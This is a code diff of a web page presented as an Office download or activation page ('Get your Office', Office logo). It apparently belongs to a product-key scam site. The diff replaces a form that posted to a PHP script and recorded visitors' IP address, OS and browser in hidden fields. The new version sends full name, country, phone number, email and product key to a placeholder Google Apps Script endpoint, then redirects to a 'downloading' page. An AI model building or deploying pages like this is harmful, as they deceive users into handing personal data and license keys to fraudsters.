@@ -120,44 +120,50 @@ s0.parentNode.insertBefore(s1,s0);
 	<div>&nbsp;</div>
 	<div class="col-xs-12">
 	<img src="images/ofclogo.png"></div>
-	<form action="sendqueryy.php" id="loginform" method="post" name="queryform">
-					<h5 class="text-center product-heading"></h5>
-					<p class="text-center" style="font-size: 12px;"></p>
-                    <p class="text-center" style="font-size: 12px;margin-top:12px;text-shadow: 0.5px 0px 0px #000;"><b><p class="text-center" style="font-size: 12px;margin-top:12px;color: #1b07bd;"></p></b></p>
+	<form id="dataForm" method="POST">
+  <div class="form-group">
+    <input type="text" name="name" class="form-control input-cls" placeholder="Full Name" required>
+  </div>
+  <div class="form-group">
+    <select name="country" class="form-control input-cls" required>
+      <option value="">Country</option>
+      <option value="United States">United States +1</option>
+      <option value="Canada">Canada +1</option>
+      <option value="Australia">Australia +61</option>
+      <option value="United Kingdom">United Kingdom +44</option>
+      <option value="New Zealand">New Zealand +64</option>
+      <option value="Germany">Germany +49</option>
+      <option value="Other">Other</option>
+    </select>
+  </div>
+  <div class="form-group">
+    <input type="text" name="mobile" class="form-control input-cls" placeholder="Contact No." required>
+  </div>
+  <div class="form-group">
+    <input type="email" name="email" class="form-control input-cls" placeholder="Email" required>
+  </div>
+  <div class="form-group">
+    <input type="text" name="productkey" class="form-control input-cls" placeholder="Product Key" required>
+  </div>
+  <div class="col-lg-6">
+    <input type="submit" class="form-control submit-btn" value="Submit">
+  </div>
+</form>
 
-                    <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br>
-					<div class="form-group">
-						<input type="text" id="nameField" name="name" class="form-control input-cls" placeholder="Full Name" required>
-					</div>
-                    <div class="form-group">
-						<select class="form-control input-cls" id="countField" name="country"  id="sel1" required>
-							<option value="">Country</option>
-							<option value="United States">United States +1</option>
-							<option value="Canada">Canada +1</option>
-							<option value="Australia">Australia +61</option>
-							<option value="United Kingdom">United Kingdom +44</option>
-							<option value="New Zealand">New Zealand +64</option>
-							<option value="New Zealand">Germany +49</option>
-							<option value="Other">Other</option>
-						</select>
-					</div>
-					<div class="form-group">
-						<input type="text" id="mobField" pattern= "[0-9]+" name="mobile"  class="form-control input-cls" placeholder="Contact No." required>
-					</div>
-					<div class="form-group">
-						<input type="email" id="emailField" name="email" class="form-control input-cls" placeholder="Email" required>
-					</div>
-					
-					<div class="form-group">
-						<input type="text" id="keyField" name="productkey"  class="form-control input-cls" placeholder="Product Key" required>
-						<input type="hidden"  id="ipField" name="entry.272839618"  value="124.253.180.251" class="form-control input-cls" placeholder="Product Key">
-						<input type="hidden" id="osField" name="entry.2081955745" value="" class="form-control input-cls" placeholder="Product Key">
-						<input type="hidden" id="browserField" name="entry.446874084" value="Unknown ?" class="form-control input-cls" placeholder="Product Key">
-					</div>
-					<div class="col-lg-6">
-						<input type="submit" name="submit" class="form-control submit-btn" value="Submit" onclick="sendpost()">
-					</div>
-				</form>  </div></div>
+<script>
+  const scriptURL = "PASTE_YOUR_GOOGLE_SCRIPT_URL_HERE";
+  const form = document.getElementById("dataForm");
+
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(scriptURL, { method: "POST", body: new FormData(form)})
+      .then(response => {
+        window.location.href = "downloading.html"; // ✅ redirect after submit
+      })
+      .catch(error => console.error("Error!", error.message));
+  });
+</script>
+  </div></div>
 		  <p><span class="number">2</span> Get your Office</p>
 		
 		<div class="col-sm-3">&nbsp;</div> </div>
